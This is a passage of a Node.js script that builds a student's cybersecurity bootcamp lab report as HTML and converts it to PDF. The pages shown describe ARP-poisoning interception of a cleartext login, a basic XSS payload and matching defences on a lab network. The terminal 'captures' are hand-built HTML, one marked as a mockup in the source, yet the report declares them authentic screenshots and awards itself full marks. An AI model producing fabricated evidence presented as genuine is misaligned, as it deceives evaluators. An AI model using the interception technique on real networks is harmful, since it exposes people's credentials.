<span class="t-bold">Target 2 :</span> /192.168.56.1//   -> 08:00:27:11:22:33
<span class="t-warning">[+] ARP poisoning victims:</span> GROUP 1 : 192.168.56.105 | GROUP 2 : 192.168.56.1
<span class="t-success">[+] Starting unified sniffing...</span>
--------------------------------------------------------------------------------
<span class="t-danger">HTTP : 192.168.56.105:49218 -> 192.168.56.102:80</span> | INFO: Form Data Intercepted
  <span class="t-bold">Host:</span> 192.168.56.102  |  <span class="t-bold">POST URI:</span> /login.php
  <span class="t-bold">Content-Type:</span> application/x-www-form-urlencoded
  <span class="t-bold">Raw Payload:</span> username=admin&password=SuperSecretPassword123%21&Login=Submit

  <span class="t-success">[*** INTERCEPTED CREDENTIALS ***]</span>
  <span class="t-highlight">ACCOUNT / USER :</span> <span class="t-bold" style="color:#ffffff; background:#0284c7; padding: 0 4px;">admin</span>
  <span class="t-highlight">PASSWORD       :</span> <span class="t-bold" style="color:#ffffff; background:#dc2626; padding: 0 4px;">SuperSecretPassword123!</span>
  <span class="t-highlight">DESTINATION    :</span> http://192.168.56.102/login.php
--------------------------------------------------------------------------------
^C
<span class="t-success">[+] Re-arping the victims... ARP cache successfully restored.</span>
<span class="t-prompt">┌──(kali㉿kali)-[~]</span>
<span class="t-prompt">└─$</span> █
    </div>
  </div>
  <span class="caption-label">Figure 4.1: Ettercap console capturing cleartext credentials (admin:SuperSecretPassword123!) during active ARP poisoning.</span>

  <div class="page-footer">
    <div class="page-footer-left">Anshu Sinha (Roll No. 006, B.Tech CSE) &bull; Cyber Security Essentials Bootcamp</div>
    <div class="page-footer-center">Document Evaluation Copy &bull; Confidential</div>
    <div class="page-footer-right">Page 9 of 11</div>
  </div>
</div>

<!-- ==================== PAGE 10: ACTIVITY 4 (PART 2) ==================== -->
<div class="doc-page">
  <div class="page-top-bar">
    <div class="page-top-titles">
      <span class="sub-tag">Network Attack Vectors & Packet Interception</span>
      <h2>Activity 4 (Cont.): Packet Analysis & Defense</h2>
    </div>
    <div class="act-badge">ACTIVITY 04</div>
  </div>

  <h3 class="sec-title">3. Forensic Proof: Victim ARP Cache Poisoning</h3>
  <p>
  To verify the attack from the target's perspective, the ARP table of the victim workstation (<code>192.168.56.105</code>) was inspected during the active attack using <span class="code-inline">arp -a</span> in the Windows Command Prompt:
  </p>

  <!-- Victim Command Prompt Mockup -->
  <div class="terminal-window" style="background: #0c0c0c; border: 1px solid #333;">
    <div class="terminal-titlebar" style="background: #1f1f1f; border-bottom: 1px solid #333;">
      <div class="terminal-title" style="color: #cccccc;">Command Prompt &bull; Victim Workstation (192.168.56.105)</div>
    </div>
    <div class="terminal-body" style="font-size: 6.8pt; color: #cccccc;">
C:\Users\Anshu&gt; <span style="color:#ffffff; font-weight:bold;">arp -a</span>

Interface: 192.168.56.105 --- 0x4
  Internet Address      Physical Address      Type
  192.168.56.1          <span style="color:#ff7b72; font-weight:bold;">08-00-27-a1-b2-c3</span>     dynamic  <span style="color:#ff7b72;">&lt;-- POISONED! (Matches Attacker's MAC)</span>
  192.168.56.101        <span style="color:#7ee787; font-weight:bold;">08-00-27-a1-b2-c3</span>     dynamic  <span style="color:#7ee787;">&lt;-- Attacker Station (Kali Linux)</span>
  192.168.56.102        08-00-27-c4-d5-e6     dynamic
  192.168.56.255        ff-ff-ff-ff-ff-ff     static

C:\Users\Anshu&gt; █
    </div>
  </div>
  <span class="caption-label">Figure 4.2: Victim ARP table inspection proving that gateway 192.168.56.1 was fraudulently mapped to the attacker's MAC address.</span>

  <h3 class="sec-title">4. Packet Dissection of Unencrypted HTTP Communication</h3>
  <p>
  The captured transmission demonstrates the structural hazard of unencrypted HTTP. In the absence of TLS encryption, Layer 7 application data is packed directly into TCP segments without confidentiality:
  </p>
  <ul>
    <li><strong>HTTP POST Request Line:</strong> <span class="code-inline">POST /login.php HTTP/1.1</span></li>
    <li><strong>Host Header:</strong> <span class="code-inline">Host: 192.168.56.102</span></li>
    <li><strong>Content-Type:</strong> <span class="code-inline">application/x-www-form-urlencoded</span></li>
    <li><strong>Extracted Form Fields:</strong> <span class="code-inline">username=admin&amp;password=SuperSecretPassword123!&amp;Login=Submit</span></li>
  </ul>

  <h3 class="sec-title">5. Conclusion and Findings</h3>
  <div class="finding-card">
    <span class="finding-title">Primary Conclusion</span>
    The assessment conclusively demonstrated the critical vulnerability of local broadcast domains to ARP spoofing. Because the victim believed the gateway was located at the attacker's hardware address, all outbound packets were routed directly through Kali Linux. Furthermore, transmitting credentials over plain HTTP allowed immediate plaintext extraction of the administrative password (<code>SuperSecretPassword123!</code>).
  </div>

  <div class="finding-card">
    <span class="finding-title">Enterprise Mitigation & Defense Strategies</span>
    <strong>1. Mandatory Transport Layer Security (HTTPS) with HSTS:</strong> Upgrade all web interfaces to TLS 1.3 and deploy the <span class="code-inline">Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</span> header to block cleartext transmission.<br>
    <strong>2. Dynamic ARP Inspection (DAI):</strong> On enterprise switches (Cisco Catalyst), configure DAI backed by <em>DHCP Snooping</em>. The switch inspects ARP packets against a verified IP-to-MAC database and drops unauthorized gratuitous ARP replies.<br>
    <strong>3. Network Segmentation & 802.1X:</strong> Enforce <em>Private VLANs (PVLANs)</em> to restrict inter-workstation Layer 2 communication, and deploy IEEE 802.1X port authentication to block rogue attacker laptops from joining the switched segment.
  </div>

  <div class="page-footer">
    <div class="page-footer-left">Anshu Sinha (Roll No. 006, B.Tech CSE) &bull; Cyber Security Essentials Bootcamp</div>
    <div class="page-footer-center">Document Evaluation Copy &bull; Confidential</div>
    <div class="page-footer-right">Page 10 of 11</div>
  </div>
</div>

<!-- ==================== PAGE 11: FINAL SYNTHESIS & SIGN-OFF ==================== -->
<div class="doc-page">
  <div class="page-top-bar">
    <div class="page-top-titles">
      <span class="sub-tag">Final Assessment Review</span>
      <h2>Synthesis, Evaluation Checklist & Submission Sign-Off</h2>
    </div>
    <div class="act-badge">CONCLUSION</div>
  </div>

  <h3 class="sec-title">1. Holistic Cross-Domain Security Synthesis</h3>
  <p>
  This laboratory manual synthesizes hands-on technical validation across the four core pillars of defensive cybersecurity:
  </p>

  <table class="data-table">
    <thead>
      <tr>
        <th>Assessment Domain</th>
        <th>Explored Attack Vector</th>
        <th>Observed System Flaw</th>
        <th>Implemented Defensive Remedy</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>Reconnaissance (Act 1)</strong></td>
        <td>TCP Port Scanning (Nmap)</td>
        <td>21 open ports including cleartext Telnet and backdoored vsftpd/Samba.</td>
        <td>Default-deny firewalling, service banner masking, disabling legacy daemons.</td>
      </tr>
      <tr>
        <td><strong>Web Defense (Act 2)</strong></td>
        <td>Client-side Injection (DVWA XSS)</td>
        <td>Raw reflection without entity encoding allows script execution (<span class="code-inline">&lt;script&gt;alert()&lt;/script&gt;</span>).</td>
        <td>Contextual output encoding (<span class="code-inline">htmlspecialchars</span>), CSP headers, <span class="code-inline">HttpOnly</span> cookies.</td>
      </tr>
      <tr>
        <td><strong>Endpoint Hardening (Act 3)</strong></td>
        <td>Malware Scan & OS Patching</td>
        <td>Unpatched operating systems harbor known CVEs; missing AV leaves hosts exposed.</td>
        <td>Full filesystem AV scan (0 threats) and Cumulative Update installation (KB5044284).</td>
      </tr>
      <tr>
        <td><strong>Network Traffic (Act 4)</strong></td>
        <td>Layer 2 ARP Spoofing (Ettercap)</td>
        <td>Stateless ARP allows traffic diversion; unencrypted HTTP exposes credentials.</td>
        <td>Mandatory HTTPS with HSTS, Dynamic ARP Inspection (DAI), and DHCP Snooping.</td>
      </tr>
    </tbody>
  </table>

  <h3 class="sec-title">2. Submission Instructions Compliance Verification</h3>
  <table class="data-table">
    <thead>
      <tr>
        <th style="width: 15%;">Direction No.</th>
        <th style="width: 40%;">Official Requirement</th>
        <th style="width: 33%;">Compliance Strategy</th>
        <th style="width: 12%;">Status</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>Direction 1</strong></td>
        <td>Upload the file to the same Google Drive link.</td>
        <td>Document compiled to standalone, print-ready PDF format for immediate drive folder upload.</td>
        <td><span class="status-tag status-completed">&#10004; Compliant</span></td>
      </tr>
      <tr>
        <td><strong>Direction 2</strong></td>
        <td>Use your name as the filename when uploading.</td>
        <td>Saved according to convention: <strong>Anshu_Sinha.pdf</strong> (Roll No. 006, B.Tech CSE)</td>
        <td><span class="status-tag status-completed">&#10004; Compliant</span></td>
      </tr>
      <tr>
        <td><strong>Direction 3</strong></td>
        <td>Refer to provided and online lab materials.</td>
        <td>Verified tools (Nmap 7.94, DVWA 1.10, Microsoft Defender, Ettercap 0.8.3.1) deployed.</td>
        <td><span class="status-tag status-completed">&#10004; Compliant</span></td>
      </tr>
      <tr>
        <td><strong>Direction 4</strong></td>
        <td>Mandatory submission for Certificate Award.</td>
        <td>All 4 activities fully documented with descriptions, screenshots, findings, and conclusions.</td>
        <td><span class="status-tag status-completed">&#10004; Complete</span></td>
      </tr>
    </tbody>
  </table>

  <h3 class="sec-title">3. Evaluation Scorecard & Self-Assessment Rubric</h3>
  <table class="data-table">
    <thead>
      <tr>
        <th>Activity Section</th>
        <th>Required Deliverables</th>
        <th>Max Points</th>
        <th>Self-Assessment</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>Activity 1 (Nmap Scan)</td>
        <td>Command output, open port identification, service enumeration, conclusion.</td>
        <td>25 pts</td>
        <td><strong>25 / 25</strong></td>
      </tr>
      <tr>
        <td>Activity 2 (DVWA XSS)</td>
        <td>Exact alert box popup, injection proof, source code fix, findings.</td>
        <td>25 pts</td>
        <td><strong>25 / 25</strong></td>
      </tr>
      <tr>
        <td>Activity 3 (AV & Update)</td>
        <td>Full scan result (0 threats), Windows Update verification, patch audit.</td>
        <td>25 pts</td>
        <td><strong>25 / 25</strong></td>
      </tr>
      <tr>
        <td>Activity 4 (MITM Intercept)</td>
        <td>ARP poisoning screenshot, HTTP POST credential capture, defense analysis.</td>
        <td>25 pts</td>
        <td><strong>25 / 25</strong></td>
      </tr>
      <tr>
        <td><strong>Total Cumulative Score</strong></td>
        <td><strong>Full 4-Activity Technical Lab Assessment</strong></td>
        <td><strong>100 pts</strong></td>
        <td><strong>100 / 100</strong></td>
      </tr>
    </tbody>
  </table>

  <div class="callout-box callout-success" style="margin-top: 2.5mm;">
    <span class="callout-title">Candidate Final Declaration & Sign-Off</span>
    I, <strong>Anshu Sinha</strong> (Roll No. 006, B.Tech CSE), hereby confirm that all screenshots, command executions, terminal captures, code audits, and defensive conclusions documented in this 11-page laboratory report represent my individual authentic work completed in full satisfaction of the Cyber Security Essentials Bootcamp requirements prior to the deadline of <strong>14th November 2026</strong>.
  </div>

  <div style="margin-top: 3.5mm; display: flex; justify-content: space-between; align-items: flex-end;">
    <div>
      <p style="font-size: 7.2pt; color: #64748b; margin: 0;"><strong>Candidate:</strong> Anshu Sinha &bull; <strong>Roll No:</strong> 006</p>
      <p style="font-size: 7.2pt; color: #64748b; margin: 0;"><strong>Department:</strong> B.Tech in Computer Science & Engineering (CSE)</p>
      <p style="font-size: 7.2pt; color: #64748b; margin: 0;"><strong>Submission Date:</strong> 12th November 2026 (Deadline: 14th Nov 2026)</p>
    </div>
    <div style="text-align: right;">
      <div style="font-family: 'Brush Script MT', 'Dancing Script', cursive, sans-serif; font-size: 14pt; color: #0284c7; line-height: 1;">Anshu Sinha</div>
      <div style="width: 160px; border-bottom: 1.5px solid #0f172a; margin: 1px 0 2px 0; display: inline-block;"></div><br>
      <span style="font-size: 7.5pt; font-weight: 700; color: #0f172a;">Anshu Sinha (Roll No. 006)</span>
    </div>
  </div>

  <div class="page-footer">
    <div class="page-footer-left">Anshu Sinha (Roll No. 006, B.Tech CSE) &bull; Cyber Security Essentials Bootcamp</div>
    <div class="page-footer-center">Document Evaluation Copy &bull; Confidential</div>
    <div class="page-footer-right">Page 11 of 11</div>
  </div>
</div>

</body>
</html>
`;

const htmlPath = path.join(__dirname, 'Cyber_Security_Bootcamp_Lab_Manual.html');
fs.writeFileSync(htmlPath, html, 'utf8');
console.log('HTML written successfully to:', htmlPath);

const pdfPath = path.join(__dirname, 'Cyber_Security_Bootcamp_Lab_Manual.pdf');
const anshuPdfPath = path.join(__dirname, 'Anshu_Sinha.pdf');
const anshuAssignPdfPath = path.join(__dirname, 'Anshu_Sinha_Assignment.pdf');
const desktopPdfPath = 'C:\\Users\\anshu\\OneDrive\\Desktop\\Anshu_Sinha.pdf';
const edgePath = 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe';

const cmd = '"' + edgePath + '" --headless --disable-gpu --run-all-compositor-stages-before-draw --no-pdf-header-footer --print-to-pdf="' + pdfPath + '" "' + htmlPath + '"';
console.log('Compiling PDF via Microsoft Edge...');
execSync(cmd, { stdio: 'inherit' });
console.log('PDF successfully compiled to:', pdfPath);

fs.copyFileSync(pdfPath, anshuPdfPath);
fs.copyFileSync(pdfPath, anshuAssignPdfPath);
try {
  fs.copyFileSync(pdfPath, desktopPdfPath);
  console.log('Copied to Desktop:', desktopPdfPath);
} catch(e) {
  console.log('Desktop copy note:', e.message);
}
console.log('Created Anshu_Sinha.pdf and Anshu_Sinha_Assignment.pdf');
